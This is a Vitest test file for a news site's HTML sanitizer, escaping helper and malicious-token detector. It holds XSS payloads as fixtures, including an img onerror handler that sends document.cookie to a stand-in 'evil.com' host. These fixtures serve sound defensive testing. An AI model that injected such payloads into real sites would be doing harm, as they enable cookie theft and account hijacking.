import { describe, it, expect } from "vitest";
import {
  sanitizeHtml,
  escapeHtml,
  detectMaliciousTokens,
} from "@/lib/security/inputSanitizer";

describe("Security Input Sanitizer & XSS Defense", () => {
  describe("sanitizeHtml", () => {
    it("strips active script tags and executable inner JavaScript", () => {
      const malicious = '<p>Breaking News</p><script>alert("xss")</script><p>Kakamega update</p>';
      const sanitized = sanitizeHtml(malicious);
      expect(sanitized).not.toContain("<script>");
      expect(sanitized).not.toContain('alert("xss")');
      expect(sanitized).toContain("<p>Breaking News</p>");
      expect(sanitized).toContain("<p>Kakamega update</p>");
    });

    it("strips inline event handlers such as onerror and onclick", () => {
      const malicious = '<img src="valid.jpg" onerror="fetch(\'https://evil.com/steal?cookie=\' + document.cookie)" /><b onclick="steal()">Click</b>';
      const sanitized = sanitizeHtml(malicious);
      expect(sanitized).not.toContain("onerror=");
      expect(sanitized).not.toContain("onclick=");
      expect(sanitized).not.toContain("document.cookie");
    });

    it("strips javascript: URI protocol from attributes", () => {
      const malicious = '<a href="javascript:alert(1)">Read Source</a>';
      const sanitized = sanitizeHtml(malicious);
      expect(sanitized).not.toContain("javascript:");
    });

    it("strips iframes, objects, and embed tags", () => {
      const malicious = '<div><iframe src="https://phishing.com"></iframe><embed src="flash.swf"></div>';
      const sanitized = sanitizeHtml(malicious);
      expect(sanitized).not.toContain("<iframe");
      expect(sanitized).not.toContain("<embed");
    });

    it("enforces zero-emoji standard on sanitized strings", () => {
      const textWithEmoji = "<p>Governor announces agricultural relief 🌾 in Shinyalu 🚜</p>";
      const sanitized = sanitizeHtml(textWithEmoji);
      expect(sanitized).toBe("<p>Governor announces agricultural relief in Shinyalu </p>");
    });

    it("completely removes all tags when stripAllHtml option is set", () => {
      const richText = "<p><strong>Kakamega</strong> updates from <em>desk</em>.</p>";
      const plain = sanitizeHtml(richText, { stripAllHtml: true });
      expect(plain).toBe("Kakamega updates from desk.");
    });
  });

  describe("escapeHtml", () => {
    it("escapes special HTML entities", () => {
      const raw = 'Sugar < Cane & "Subsidy" > \'Fund\'';
      const escaped = escapeHtml(raw);
      expect(escaped).toBe("Sugar &lt; Cane &amp; &quot;Subsidy&quot; &gt; &#039;Fund&#039;");
    });
  });

  describe("detectMaliciousTokens", () => {
    it("identifies known injection tokens in untrusted input", () => {
      const res1 = detectMaliciousTokens('<script>eval("attack")</script>');
      expect(res1.isMalicious).toBe(true);
      expect(res1.detectedThreats).toContain("Script Tag Injection");

      const res2 = detectMaliciousTokens('<div onmouseover="hack()">Hover</div>');
      expect(res2.isMalicious).toBe(true);
      expect(res2.detectedThreats).toContain("DOM Event Handler Injection");

      const res3 = detectMaliciousTokens('<a href="javascript:doSomething()">Link</a>');
      expect(res3.isMalicious).toBe(true);
      expect(res3.detectedThreats).toContain("JavaScript URI Scheme");

      const cleanInput = "Kakamega County unveils agricultural support program.";
      const resClean = detectMaliciousTokens(cleanInput);
      expect(resClean.isMalicious).toBe(false);
      expect(resClean.detectedThreats).toHaveLength(0);
    });
  });
});
